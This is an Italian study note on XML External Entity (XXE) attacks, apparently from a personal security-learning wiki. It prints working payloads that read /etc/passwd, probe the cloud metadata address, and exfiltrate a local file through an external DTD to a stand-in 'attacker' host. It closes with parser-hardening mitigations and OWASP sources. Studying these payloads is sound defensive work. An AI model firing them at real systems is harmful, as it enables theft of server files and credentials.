---
tipo: concetto
tag: [web, owasp]
fase: 2
fonti: 3
aggiornato: 2026-06-21
stato: maturo
aliases: ["XML External Entity (XXE)", "XXE"]
---

# XML External Entity (XXE)

> **Nota etica**: praticare solo su lab autorizzati (PortSwigger Academy, DVWA, TryHackMe).

## In breve
La **XXE** sfrutta i parser XML che processano le **entità esterne** del DTD. Permette di **leggere file locali**, fare richieste interne (XXE→[[Server-Side Request Forgery (SSRF)]]), esfiltrare dati in blind e talvolta DoS o RCE. Categoria **A05** dell'[[OWASP Top 10]]. Bersagli tipici: API SOAP, upload di documenti (DOCX, SVG, XML), endpoint che accettano `Content-Type: application/xml`.

## Le entità XML
Il DTD può definire **entità** (variabili). Quelle **esterne** puntano a risorse fuori dal documento (`file://`, `http://`). Un parser che risolve il DTD senza restrizioni esegue quelle richieste con i privilegi del server.

## In-band — lettura file
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<ordine><prodotto>&xxe;</prodotto></ordine>
```
Se l'app riflette `<prodotto>` nella risposta → leggi `/etc/passwd`. Per file con caratteri che rompono l'XML, usa il wrapper PHP base64:
`SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"`.

## XXE → SSRF
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```
Il parser fa la richiesta interna → metadati cloud / servizi interni (vedi [[Server-Side Request Forgery (SSRF)]]).

## Blind XXE (out-of-band)
Nessun output in pagina → esfiltra via DNS/HTTP verso un tuo server (OAST), con un DTD esterno:
```xml
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://attacker/evil.dtd"> %ext; ]>
```
`evil.dtd` legge un file e lo accoda a un URL controllato:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?x=%file;'>">
%eval; %exfil;
```

## Mitigazione (priorità)
1. **Disabilitare DTD ed entità esterne** nel parser (difesa primaria):
   - Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
   - PHP: entity loader disabilitato di default da libxml 2.9 / PHP 8
   - .NET: `XmlReaderSettings.DtdProcessing = Prohibit`
2. Preferire **JSON** dove possibile; validare con **XSD** rigido.
3. Minimo privilegio sul processo di parsing; WAF come strato extra.

## Collegamenti
- [[OWASP Top 10]]
- [[Server-Side Request Forgery (SSRF)]]
- [[Security Misconfiguration]]
- [[HTTP e HTTPS]]
- [[Burp Suite]]
- [[PortSwigger Web Academy]]

## Fonti
- PortSwigger — XXE: https://portswigger.net/web-security/xxe
- OWASP — XXE Processing: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
- OWASP — XXE Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
